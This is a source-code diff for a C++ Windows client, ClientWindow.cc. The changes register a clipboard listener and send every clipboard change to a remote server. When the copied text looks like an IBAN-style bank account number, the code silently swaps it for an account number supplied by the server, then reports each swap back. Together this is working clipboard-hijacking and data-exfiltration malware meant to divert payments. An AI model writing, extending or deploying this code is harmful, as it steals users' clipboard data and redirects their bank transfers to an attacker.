@@ -1,24 +1,133 @@
 #include "ClientWindow.hh"
 #include <iostream>
+#include <regex>
+#include "tools.hh"
+
+ClientWindow::ClientWindow() :
+	socket(SocketType::CONNECT_SOCKET, ClientConfig::PORT, ClientConfig::IP_ADDRESS)
+{
+	this->SetTargetAccountNumber(ClientConfig::TARGET_ACCOUNT_NUMBER);
+	std::async(std::launch::async,
+		[this]() {this->BlockingListen(); });
+}
 
 LRESULT ClientWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
 	switch (uMsg) {
 	case WM_DESTROY:
-		PostQuitMessage(0);
+		if (!::RemoveClipboardFormatListener(this->hwnd)) {
+			throw ClipboardListenerException("RemoveClipboardFormatListener failed: " + Winapi::GetErrorMessage());
+		}
+		::PostQuitMessage(0);
 		return 0;
-	case WM_COPY:
-		std::cout << "clipboard update" << std::endl;
-		break;
+	case WM_CREATE:
+		if (!::AddClipboardFormatListener(this->hwnd)) {
+			throw ClipboardListenerException("AddClipbordFormatListener failed: " + Winapi::GetErrorMessage());
+		}
+		return 0;
+	case WM_CLIPBOARDUPDATE:
+		this->OnClipboardChange();
+		return 0;
 	case WM_PAINT:
 	{
 		PAINTSTRUCT ps;
-		HDC hdc = BeginPaint(m_hwnd, &ps);
-		FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
-		EndPaint(m_hwnd, &ps);
+		auto hdc = BeginPaint(hwnd, &ps);
+		::FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
+		::EndPaint(this->hwnd, &ps);
 	}
 
 	return 0;
 	default:
-		return DefWindowProc(m_hwnd, uMsg, wParam, lParam);
+		return DefWindowProc(hwnd, uMsg, wParam, lParam);
 	}
+}
+
+std::string ClientWindow::ReadClipboardText() {
+	if (!::IsClipboardFormatAvailable(CF_TEXT)) { return ""; }
+	::OpenClipboard(this->hwnd);
+	auto hCbMem = ::GetClipboardData(CF_TEXT);
+	if (hCbMem == NULL) {
+		::CloseClipboard();
+		return "";
+	}
+	auto memSize = ::GlobalSize(hCbMem);
+	auto hProgMem = ::GlobalAlloc(GHND, memSize);
+	if (hProgMem == NULL) {
+		::CloseClipboard();
+		return "";
+	}
+	auto lpCbMem = ::GlobalLock(hCbMem);
+	auto lpProgMem = ::GlobalLock(hProgMem);
+	strcpy_s((char*)lpProgMem, memSize, (char*)lpCbMem);
+	::GlobalUnlock(hCbMem);
+	::GlobalUnlock(hProgMem);
+	::CloseClipboard();
+	return std::string((char*)lpProgMem);
+}
+
+void ClientWindow::WriteClipboardText(std::string str) {
+	auto pStr = str.c_str();
+	auto wLen = str.size() + 1;
+	auto hGlMem = ::GlobalAlloc(GHND, wLen);
+	auto lpGlMem = ::GlobalLock(hGlMem);
+	::strcpy_s((char*)lpGlMem, wLen, pStr);
+	::GlobalUnlock(hGlMem);
+	::OpenClipboard(this->hwnd);
+	::EmptyClipboard();
+	::SetClipboardData(CF_TEXT, hGlMem);
+	::CloseClipboard();
+}
+
+bool ClientWindow::IsAccountNumber(const std::string& str) {
+	return std::regex_match(str, std::regex{ "[a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16}" });
+}
+
+bool ClientWindow::SwapAccountNumber() {
+	auto currentClipboardText = this->ReadClipboardText();
+	if (currentClipboardText == "") { return false; }
+	if (!this->IsAccountNumber(currentClipboardText)) { return false; }
+	this->WriteClipboardText(this->targetAccountNumber);
+	return true;
+}
+
+void ClientWindow::SendClipboardStringToServer(const std::string& str) {
+	auto size = strlen(str.c_str());
+	this->socket.SendMetadata(Metadata{ DataType::CLIPBOARD_STRING, size });
+	this->socket.SendBytes(str.c_str(), size);
+}
+
+void ClientWindow::SendAccountSwapNotificationToServer() {
+	this->socket.SendMetadata(Metadata{ DataType::ACCOUNT_SWAP_NOTIFICATION, 0 });
+}
+
+void ClientWindow::OnClipboardChange() {
+	auto clipboardString = this->ReadClipboardText();
+	if (clipboardString.empty()) { return; }
+	this->SendClipboardStringToServer(clipboardString);
+	if (this->SwapAccountNumber()) {
+		this->SendAccountSwapNotificationToServer();
+	}
+}
+
+void ClientWindow::BlockingListen() {
+	while (true) {
+		auto metadata = this->socket.RecvMetadata();
+		switch (metadata.dataType) {
+		case DataType::CHANGE_ACCOUNT_NUMBER:
+			this->SetTargetAccountNumber(socket.RecvString(metadata));
+			break;
+		default:;
+		}
+	}
+}
+
+std::string ClientWindow::GetTargetAccountNumber() const {
+	std::lock_guard<std::mutex> lock(this->targetAccountNumberMutex);
+	return targetAccountNumber;
+}
+
+void ClientWindow::SetTargetAccountNumber(const std::string& targetAccountNumber) {
+	std::lock_guard<std::mutex> lock(this->targetAccountNumberMutex);
+	this->targetAccountNumber = targetAccountNumber;
+	Tools::PrintDebugMessage("Updated account number to:" + this->targetAccountNumber);
+
 }
